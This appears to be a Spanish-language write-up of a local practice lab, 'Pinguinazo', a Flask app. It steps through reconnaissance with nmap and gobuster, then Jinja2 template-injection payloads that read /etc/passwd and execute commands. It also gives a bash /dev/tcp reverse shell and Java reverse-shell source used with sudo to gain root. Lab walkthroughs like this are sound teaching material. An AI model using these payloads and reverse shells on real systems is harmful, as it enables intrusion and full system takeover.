- Tags: #Pinguinazo #Flask #ReverShellJava
---
[Maquina Pinguinazo](https://mega.nz/file/xeNVTA5B#RXNj1lKF2Gab1HwAWE1SdMtb8CFPJh4le7jsSWjZ7qc) -> Enlace de descarga al laboratorio

```bash
7z x pinguinazo.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh pinguinazo.tar # Desplegamos el laboratorio
```

### Fase Reconocimiento:
```bash
ping -c 172.17.0.2 # Realizamos una traza ICMP para determinar la conectividad con el target

wichSystem.py 172.17.0.2 # Gracias al ttl determinamos que estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```

### Fase Enumeracion Puertos y Servicios:
```bash
escanerTCP.py -t 172.17.0.2 -p 1-60000 # Usamos nuestra herramienta para deterctar puertos expuestos en el target
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos deteccion de puertos expuestos
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
nmap -sC -sV -p5000 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que cooren detras de estos puetos.
```

### Fase Enumeracion Web:
```bash
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3) # Tenemos corriendo flask
```

```bash
whatweb http://172.17.0.2:5000 # Realizamos deteccion de tecnologias para este servicio web

Email[admin@pingulab.lab] # Tenemos un correo con el nombre de un potencial usuario
```

```bash
nmap --script http-enum -p 5000 172.17.0.2 # No reporta nada critico
```

```bash
http://172.17.0.2:5000/ # Tenemos de pagina principal un formulario de contacto
```

```bash
# No obtuvimos nada
gobuster dir -u http://172.17.0.2:5000/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
gobuster dir -u http://172.17.0.2:5000/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x py,txt,html,css,js,php,php.back
```

### Fase Explotacion:
```bash
{{7*7}} # Logramos inyectar codigo en la plantilla de jinja2
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }} # Apuntamos por este archivo para ver usuarios del sistema

pinguinazo # Usuario valido del sistema
```

```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }} # Inicamos ejecucion remota de comandos.
```

El comando nos retorna que el servicio esta corriendo bajo el usuario: **( pinguinazo )**, De esta manera cuando ganemos acceso estaremos con esa sesion.

### Fase Intrusion:
```bash
nc -nlvp 443 # Nos ponemos en escucha.

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "exec bash -i &>/dev/tcp/$IP/$PORT <&1"').read() }}
```

### Fase Escalada Privilegios:
**Nota** -> Tenemos capacidad de ejecutar el binario de **java** con privilegios de root.
Nos crearemos una **reverShell** con **java** bajo el nombre de **( shell.java )** en el directorio **tmp** para poder elevar privilegios
```java
public class shell {
   public static void main(String[] args) {
       Process p;
       try {
           p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/172.17.0.1/444 0>&1");
           p.waitFor();
           p.destroy();
       } catch (Exception e) {}
   }
}
```

```bash
nc -nlvp 443 # Nos ponemos en escucha

sudo /usr/bin/java /tmp/shell.java # ejecutamos la shell
```

```bash
root@6dd7550e5bde:/tmp# whoami

root # Logramos elevar privilegios a root.
```